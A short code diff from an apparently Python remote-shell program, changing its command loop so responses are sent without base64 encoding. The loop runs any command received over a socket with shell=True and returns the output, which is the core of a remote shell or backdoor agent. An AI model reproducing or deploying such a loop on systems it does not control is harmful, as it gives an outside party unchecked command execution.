@@ -432,9 +432,9 @@ def start_server():
                 if len(command) > 3 and command[0:3] == "cd ":
                     try:
                         os.chdir(command[3:])
-                        send_response(server_socket, base64.b64encode("EMPTY"))
+                        send_response(server_socket, "EMPTY")
                     except OSError:
-                        send_response(server_socket, base64.b64encode("EMPTY"))
+                        send_response(server_socket, "EMPTY")
                         pass
                 else:
                     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
@@ -446,9 +446,9 @@ def start_server():
                         response = stdout + stderr
 
                         if not response:
-                            send_response(server_socket, base64.b64encode("EMPTY"))
+                            send_response(server_socket, "EMPTY")
                         else:
-                            send_response(server_socket, base64.b64encode(response))
+                            send_response(server_socket, response)
                     finally:
                         timer.cancel()
 
